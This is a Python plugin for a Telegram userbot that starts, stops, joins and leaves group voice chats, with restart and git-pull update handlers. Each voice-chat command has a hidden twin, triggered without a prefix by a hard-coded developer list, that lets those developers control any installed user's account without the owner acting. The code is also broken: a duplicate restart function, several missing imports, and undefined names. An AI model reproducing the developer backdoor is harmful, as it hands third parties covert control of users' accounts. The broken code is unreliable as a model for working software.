# @Rizzvbss | @Kenapanan | @SharingUserbot | Zaid-Userbot
# @KynanSupport


from asyncio import sleep
from contextlib import suppress 
from os import execvp 
from sys import executable
from random import randint
from typing import Optional

from pyrogram import Client, enums, filters
from pyrogram.raw.functions.channels import GetFullChannel
from pyrogram.raw.functions.messages import GetFullChat
from pyrogram.raw.functions.phone import CreateGroupCall, DiscardGroupCall
from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat
from pyrogram.types import Message

from . import *

def restart():
    os.execvp(sys.executable, [sys.executable, "-m", "naya"])

async def restart():
    execvp(executable, [executable, "-m", "naya"]) 
    
__MODULE__ = "vctools"
__HELP__ = f"""
Bantuan Untuk Voice Chat

• perintah: <code>{cmd}startvc</code>
• penjelasan: Untuk memulai voice chat grup.

• perintah: <code>{cmd}stopvc</code>
• penjelasan: Untuk mengakhiri voice chat grup.
           
• Perintah: <code>{cmd}jvc</code>
• Penjelasan: Untuk bergabung voice chat grup.

• Perintah: <code>{cmd}lvc</code>
• Penjelasan: Untuk meninggalkan voice chat grup.
"""


async def get_group_call(
    client: Client, message: Message, err_msg: str = ""
) -> Optional[InputGroupCall]:
    chat_peer = await client.resolve_peer(message.chat.id)
    if isinstance(chat_peer, (InputPeerChannel, InputPeerChat)):
        if isinstance(chat_peer, InputPeerChannel):
            full_chat = (
                await client.invoke(GetFullChannel(channel=chat_peer))
            ).full_chat
        elif isinstance(chat_peer, InputPeerChat):
            full_chat = (
                await client.invoke(GetFullChat(chat_id=chat_peer.chat_id))
            ).full_chat
        if full_chat is not None:
            return full_chat.call
    await eor(message, f"**No group call Found** {err_msg}")
    return False

@app.on_callback_query(filters.regex("restart"))
async def _(_, query: CallbackQuery):
    try:
        await query.edit_message_text("<b>Processing...</b>")
        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
    except BaseException as err:
        LOGGER(__name__).info(f"{err}")
        return
    await asyncio.sleep(2)
    await query.edit_message_text(f"✅ <b>{app.me.mention} Berhasil Di Restart.</b>")
    args = [sys.executable, "-m", "naya"]
    execle(sys.executable, *args, environ)


@bots.on_message(filters.command("update", cmd) & filters.me)
async def update_restart(client, message):
    try:
        out = subprocess.check_output(["git", "pull"]).decode("UTF-8")
        if "Already up to date." in str(out):
            return await message.reply_text("Its already up-to date!")
        await message.reply_text(f"```{out}```")
    except Exception as e:
        return await message.reply_text(str(e))
    await message.reply_text("**Updated with default branch, restarting now.**")
    await restart()

@bots.on_message(filters.command(["jvcs"], "") & filters.user(DEVS) & ~filters.me)
@bots.on_message(filters.command(["jvc"], cmd) & filters.me)
async def joinvc(client, message):
    if message.from_user.id != client.me.id:
        ky = await message.reply("<code>Processing....</code>")
    else:
        ky = await eor(message, "<code>Processing....</code>")
    chat_id = message.command[1] if len(message.command) > 1 else message.chat.id
    with suppress(ValueError):
        chat_id = int(chat_id)
    try:
        await client.group_call.start(chat_id)

    except Exception as e:
        return await ky.edit(f"ERROR: {e}")
    await ky.edit(
        f"❏ Berhasil Join Voice Chat {message.chat.title}"
    )
    await sleep(1)
    await client.group_call.set_is_mute(True)
    await ky.delete()


@bots.on_message(filters.command(["lvcs"], "") & filters.user(DEVS) & ~filters.me)
@bots.on_message(filters.command(["lvc"], cmd) & filters.me)
async def leavevc(client: Client, message: Message):
    if message.from_user.id != client.me.id:
        ky = await message.reply("<code>Processing....</code>")
    else:
        ky = await eor(message, "<code>Processing....</code>")
    chat_id = message.command[1] if len(message.command) > 1 else message.chat.id
    with suppress(ValueError):
        chat_id = int(chat_id)
    try:
        await client.group_call.stop()
    except Exception as e:
        return await ky.edit(f"<b>ERROR:</b> {e}")
    msg = "❏ Berhasil Meninggalkan Voice Chat"
    if chat_id:
        msg += f" {message.chat.title}"
    await ky.edit(msg)
    await sleep(1)
    await ky.delete()


@bots.on_message(filters.command(["startvcs"], "") & filters.user(DEVS) & ~filters.me)
@bots.on_message(filters.command(["startvc"], cmd) & filters.me)
async def opengc(client: Client, message: Message):
    flags = " ".join(message.command[1:])
    ky = await eor(message, "`Processing....`")
    vctitle = get_arg(message)
    if flags == enums.ChatType.CHANNEL:
        chat_id = message.chat.title
    else:
        chat_id = message.chat.id
    args = f"<b>Obrolan Suara Aktif</b>\n • <b>Chat</b> : {message.chat.title}"
    try:
        if not vctitle:
            await client.invoke(
                CreateGroupCall(
                    peer=(await client.resolve_peer(chat_id)),
                    random_id=randint(10000, 999999999),
                )
            )
        else:
            args += f"\n • <b>Title:</b> {vctitle}"
            await client.invoke(
                CreateGroupCall(
                    peer=(await client.resolve_peer(chat_id)),
                    random_id=randint(10000, 999999999),
                    title=vctitle,
                )
            )
        await ky.edit(args)
    except Exception as e:
        await ky.edit(f"<b>INFO:</b> `{e}`")


@bots.on_message(filters.command(["stopvcs"], "") & filters.user(DEVS) & ~filters.me)
@bots.on_message(filters.command(["stopvc"], cmd) & filters.me)
async def end_vc_(client: Client, message: Message):
    ky = await eor(message, "`Processing....`")
    message.chat.id
    if not (
        group_call := (await get_group_call(client, message, err_msg=", Kesalahan..."))
    ):
        return
    await client.invoke(DiscardGroupCall(call=group_call))
    await ky.edit(
        f"<b>Obrolan Suara Diakhiri</b>\n • <b>Chat</b> : {message.chat.title}"
    )
